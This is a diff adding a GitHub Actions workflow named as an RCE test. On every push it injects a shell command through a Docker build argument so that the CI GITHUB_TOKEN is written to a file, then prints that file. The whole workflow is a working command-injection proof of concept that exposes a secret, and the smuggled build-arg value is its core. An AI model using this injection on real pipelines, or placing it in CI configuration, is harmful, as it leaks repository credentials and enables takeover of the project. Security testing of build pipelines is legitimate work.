@@ -1,0 +1,18 @@
+name: RCE Test via Build ARG
+
+on: push
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Build with injected ARG
+        run: |
+          docker build --build-arg PYTHON_VERSION='echo "GITHUB_TOKEN=$GITHUB_TOKEN" > /leak' -t rce-image .
+
+      - name: Show leak
+        run: |
+          docker run rce-image cat /leak || echo "No RCE"
